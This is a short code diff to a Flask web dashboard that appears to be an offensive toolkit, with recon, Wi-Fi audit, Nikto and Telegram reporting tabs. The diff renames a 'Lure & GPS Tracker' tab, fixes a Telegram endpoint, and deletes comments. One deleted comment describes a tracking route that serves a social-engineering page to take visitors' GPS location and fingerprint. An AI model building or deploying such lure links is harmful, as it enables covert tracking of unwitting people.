@@ -113,7 +113,7 @@ HTML_TEMPLATE = """
         
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
-            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 Lure & Geolocation Tracker</button>
+            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 Lure & GPS Tracker</button>
             <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram Test</button>
             <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
             <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
@@ -416,10 +416,8 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
-# --- GELİŞMİŞ LURE LINK VE GPS TRACKER ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
-    # Kullanıcıya GPS konumunu ve parmak izini isteyeceğimiz akıllı sosyal mühendislik şablonu sunuyoruz
     return f"""
     <!DOCTYPE html>
     <html lang="tr">
@@ -609,7 +607,8 @@ def api_download_pdf():
 
 @app.route("/api/telegram-send", methods=["POST"])
 def api_telegram_send():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}, 401
+    if not session.get("logged_in"):
+        return jsonify({"error": "Unauthorized"}), 401
     d = request.get_json()
     res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
     return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})
